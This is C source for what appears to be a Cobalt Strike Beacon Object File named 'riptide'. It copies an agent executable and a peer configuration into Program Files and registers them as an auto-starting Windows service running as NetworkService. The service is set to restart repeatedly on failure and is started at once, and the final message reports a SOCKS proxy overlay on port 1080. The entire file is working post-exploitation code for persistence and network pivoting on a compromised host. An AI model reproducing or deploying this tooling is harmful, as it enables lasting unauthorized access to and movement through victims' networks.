#include "beacon.h"
#include <windows.h>
#include <winsvc.h>

#ifndef SC_MANAGER_CREATE_SERVICE
#define SC_MANAGER_CREATE_SERVICE 0x0002
#endif
#ifndef SERVICE_WIN32_OWN_PROCESS
#define SERVICE_WIN32_OWN_PROCESS 0x00000010
#endif
#ifndef SERVICE_AUTO_START
#define SERVICE_AUTO_START 0x00000002
#endif
#ifndef SERVICE_ERROR_NORMAL
#define SERVICE_ERROR_NORMAL 0x00000001
#endif
#ifndef SERVICE_ALL_ACCESS
#define SERVICE_ALL_ACCESS 0xF01FF
#endif
#ifndef ERROR_SERVICE_EXISTS
#define ERROR_SERVICE_EXISTS 1073
#endif
#ifndef ERROR_SERVICE_ALREADY_RUNNING
#define ERROR_SERVICE_ALREADY_RUNNING 1056
#endif
#ifndef SERVICE_CONFIG_FAILURE_ACTIONS
#define SERVICE_CONFIG_FAILURE_ACTIONS 2
#endif
#ifndef SERVICE_CONFIG_DELAYED_AUTO_START_INFO
#define SERVICE_CONFIG_DELAYED_AUTO_START_INFO 3
#endif
#ifndef SC_ACTION_RESTART
#define SC_ACTION_RESTART 1
#endif

WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);
WINBASEAPI BOOL WINAPI KERNEL32$CopyFileA(LPCSTR, LPCSTR, BOOL);
WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
WINADVAPI BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE, DWORD, LPCSTR *);
WINADVAPI BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$ChangeServiceConfig2A(SC_HANDLE, DWORD, LPVOID);
WINBASEAPI int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *);

#ifndef INVALID_FILE_ATTRIBUTES
#define INVALID_FILE_ATTRIBUTES ((DWORD)-1)
#endif

typedef struct _SC_ACTION_B {
    DWORD Type;
    DWORD Delay;
} SC_ACTION_B;

typedef struct _SERVICE_FAILURE_ACTIONS_B {
    DWORD dwResetPeriod;
    LPSTR lpRebootMsg;
    LPSTR lpCommand;
    DWORD cActions;
    SC_ACTION_B *lpsaActions;
} SERVICE_FAILURE_ACTIONS_B;

typedef struct _SERVICE_DELAYED_AUTO_START_INFO_B {
    BOOL fDelayedAutostart;
} SERVICE_DELAYED_AUTO_START_INFO_B;

static int nonempty(const char *s)
{
    return s && s[0];
}

void go(char *args, int len)
{
    datap parser;
    char *src_exe;
    char *src_conf;
    char *svc;
    char pf[MAX_PATH];
    char dest_dir[MAX_PATH];
    char dest_exe[MAX_PATH];
    char dest_conf[MAX_PATH];
    char binpath[MAX_PATH * 2];
    SC_HANDLE scm, hsvc;
    DWORD err;
    SC_ACTION_B actions[3];
    SERVICE_FAILURE_ACTIONS_B fa;
    SERVICE_DELAYED_AUTO_START_INFO_B delayed;

    BeaconDataParse(&parser, args, len);
    src_exe = BeaconDataExtract(&parser, NULL);
    src_conf = BeaconDataExtract(&parser, NULL);
    svc = BeaconDataExtract(&parser, NULL);

    if (!nonempty(src_exe)) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] need src exe path\n");
        return;
    }
    if (!nonempty(svc))
        svc = "RiptideAgent";

    if (KERNEL32$GetFileAttributesA(src_exe) == INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] exe missing %s err=%u\n", src_exe, KERNEL32$GetLastError());
        return;
    }

    if (!KERNEL32$GetEnvironmentVariableA("ProgramFiles", pf, MAX_PATH)) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] ProgramFiles err=%u\n", KERNEL32$GetLastError());
        return;
    }
    MSVCRT$_snprintf(dest_dir, MAX_PATH, "%s\\Riptide", pf);
    MSVCRT$_snprintf(dest_exe, MAX_PATH, "%s\\riptide-agent.exe", dest_dir);
    MSVCRT$_snprintf(dest_conf, MAX_PATH, "%s\\peer.conf", dest_dir);
    KERNEL32$CreateDirectoryA(dest_dir, NULL);

    if (!KERNEL32$CopyFileA(src_exe, dest_exe, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] CopyFile exe err=%u\n", KERNEL32$GetLastError());
        return;
    }
    if (nonempty(src_conf)) {
        if (!KERNEL32$CopyFileA(src_conf, dest_conf, FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "[riptide] CopyFile conf err=%u\n", KERNEL32$GetLastError());
            return;
        }
    }

    MSVCRT$_snprintf(binpath, sizeof(binpath), "\"%s\" --config \"%s\"", dest_exe, dest_conf);

    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "[riptide] OpenSCManager err=%u (need SYSTEM/admin)\n", KERNEL32$GetLastError());
        return;
    }

    hsvc = ADVAPI32$CreateServiceA(
        scm,
        svc,
        svc,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        binpath,
        NULL,
        NULL,
        NULL,
        "NT AUTHORITY\\NetworkService",
        NULL);
    if (!hsvc) {
        err = KERNEL32$GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hsvc = ADVAPI32$OpenServiceA(scm, svc, SERVICE_ALL_ACCESS);
        }
        if (!hsvc) {
            BeaconPrintf(CALLBACK_ERROR, "[riptide] CreateService err=%u\n", err);
            ADVAPI32$CloseServiceHandle(scm);
            return;
        }
    }

    delayed.fDelayedAutostart = TRUE;
    ADVAPI32$ChangeServiceConfig2A(hsvc, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &delayed);

    actions[0].Type = SC_ACTION_RESTART;
    actions[0].Delay = 5000;
    actions[1].Type = SC_ACTION_RESTART;
    actions[1].Delay = 5000;
    actions[2].Type = SC_ACTION_RESTART;
    actions[2].Delay = 5000;
    fa.dwResetPeriod = 86400;
    fa.lpRebootMsg = NULL;
    fa.lpCommand = NULL;
    fa.cActions = 3;
    fa.lpsaActions = actions;
    ADVAPI32$ChangeServiceConfig2A(hsvc, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);

    if (!ADVAPI32$StartServiceA(hsvc, 0, NULL)) {
        err = KERNEL32$GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            BeaconPrintf(CALLBACK_ERROR, "[riptide] StartService err=%u\n", err);
            ADVAPI32$CloseServiceHandle(hsvc);
            ADVAPI32$CloseServiceHandle(scm);
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[riptide] service %s running  exe=%s  overlay SOCKS :1080\n", svc, dest_exe);
    ADVAPI32$CloseServiceHandle(hsvc);
    ADVAPI32$CloseServiceHandle(scm);
}
